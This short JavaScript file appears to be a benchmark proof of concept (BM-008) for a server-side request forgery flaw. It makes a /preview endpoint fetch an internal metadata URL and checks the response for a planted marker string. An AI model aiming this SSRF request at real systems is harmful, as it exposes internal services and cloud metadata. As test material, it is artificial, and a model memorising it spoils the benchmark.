'use strict';

const poc = require('./lib/common');

// BM-008: SSRF in /preview towards a service that only exists on the internal network.
poc.run(async function () {
  const res = await poc.request('GET', '/preview?' + poc.query({ url: 'http://internal:8081/latest/meta' }));
  poc.finish(res.body.includes('INTERNAL-ONLY-7c1e'), 'status ' + res.status + ', internal metadata ' + (res.body.includes('INTERNAL-ONLY-7c1e') ? 'fetched' : 'not fetched'));
});
